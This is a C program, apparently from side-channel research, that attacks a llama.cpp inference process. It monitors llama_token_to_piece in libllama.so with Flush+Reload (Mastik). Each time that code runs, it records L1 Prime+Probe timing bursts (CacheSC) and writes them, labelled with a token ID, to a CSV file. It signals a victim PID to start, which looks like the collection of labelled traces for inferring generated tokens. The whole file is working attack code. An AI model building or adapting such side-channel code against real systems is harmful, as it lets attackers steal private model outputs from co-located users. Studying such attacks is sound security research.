#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sched.h>

#include <signal.h>
#include <sys/wait.h>

#include <emmintrin.h> 

#include <mastik/fr.h>
#include <mastik/low.h>
#include <mastik/util.h>
#include "/home/user/Projects/CacheSC/include/cachesc.h"


#define CPU_SELF 3
#define CPU_VICTIM 7

#define PRIME_EVERY 250
#define BURST_WINDOW 30
#define MAX_DETECTIONS 5


static void bind_cpu(int cpu_to_bind) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu_to_bind, &set);
    sched_setaffinity(0, sizeof(set), &set);
}


fr_t fr_build(){
    void *ptr = map_offset("/home/user/Projects/llamacpp_detection/.venv/lib/python3.10/site-packages/llama_cpp/lib/libllama.so", 0x16a4e0);
    if (ptr == NULL) {
        fprintf(stderr, "Could not locate llama_token_to_piece\n");
        exit(EXIT_FAILURE);
    }

    // printf("[*] monitoring decode_bytes %p\n", ptr);

    /* 2) FR setup */
    fr_t fr = fr_prepare();
    fr_monitor(fr, ptr);

    return fr;
}


void send_signal_to_victim(int victim_pid) {
    if (kill(victim_pid, SIGUSR1) == -1) {
        perror("Failed to send signal to victim process");
    }
}


void dump_results(const char *file_name, int nsets, char * token_index, uint32_t *all_probe_counts)
{
    FILE *out = fopen(file_name, "a");

    int token_index_int = atoi(token_index);

    for (int det = 0; det < MAX_DETECTIONS; det++) {
        for (int iter = 0; iter < BURST_WINDOW; iter++) {
            for (int set = 0; set < nsets; set++) {
                size_t idx = ((size_t)det * BURST_WINDOW + iter) * nsets + set;
                // Format matches your original: token, cache-set, iter, set, probe
                fprintf(out, "%d,%d,%d,%d,%u\n",
                        token_index_int,
                        det,
                        iter,
                        set,
                        all_probe_counts[idx]);
            }
        }
    }
    fclose(out);
}

int main(int argc, char **argv) {
    bind_cpu(CPU_SELF);
    if (argc < 4) {
        fprintf(stderr, "Usage: %s <token_id> <file_name> <victim_pid>\n", argv[0]);
        return EXIT_FAILURE;
    }

    fr_t fr = fr_build();
    int victim_pid = atoi(argv[3]);

    cache_ctx *ctx = get_cache_ctx(L1);
    if (!ctx) {
        fprintf(stderr, "Failed to initialize CacheSC L1 context\n");
        return EXIT_FAILURE;
    }
    cacheline *curr_head = prepare_cache_ds(ctx);
    if (!curr_head) {
        fprintf(stderr, "Failed to prepare L1 cache data structure\n");
        release_cache_ctx(ctx);
        return EXIT_FAILURE;
    }

    delayloop(3000000000U);  // wait for victim to be ready

    // prepare the saving structure
    int nsets = L1_SETS;
    int total_bursts = MAX_DETECTIONS * BURST_WINDOW;
    
    uint32_t *all_probe_counts = calloc(total_bursts * nsets, sizeof(uint32_t));
    time_type *burst_measurements = malloc(nsets * BURST_WINDOW * sizeof(time_type));


    /* Detect and Act */
    uint16_t fr_res[1];
    int detected_count = 0;
    int no_probe_count = 0;

    send_signal_to_victim(victim_pid);

    cacheline *next;
    while(detected_count < MAX_DETECTIONS) {
        fr_probe(fr, fr_res);
        if (fr_res[0] < 100) {
            // prime -> then in loop of BURST_WINDOW times we probe and record messurements -> then save
            curr_head = prime(curr_head);

            for (int i = 0; i < BURST_WINDOW; i++) {
                next = probe_all_cachelines(curr_head);
                // next = probe(L1, curr_head);
                get_msrmts_for_all_set(curr_head, burst_measurements + i * nsets);
                curr_head = next;
            }

            // save the burst measurements
            for (int i = 0; i < BURST_WINDOW; i++) {
                for (int s = 0; s < nsets; ++s) {
                    _mm_stream_si32(
                        (int *)(all_probe_counts + (detected_count * BURST_WINDOW + i) * nsets + s),
                        burst_measurements[i * nsets + s]
                    );
                }
            }
            
            clear_cache(ctx);
            detected_count++;

        }
        delayloop(10000);  // delay to avoid flooding output

        // dont forget the maintnace prime to keep all close let's say every 250 iterations
        if (++no_probe_count == PRIME_EVERY){
            no_probe_count = 0;
            curr_head = prime(curr_head);
        }        
    }

    dump_results(argv[2], nsets, argv[1], all_probe_counts);
    
    /* cleanup */
    return 0;
}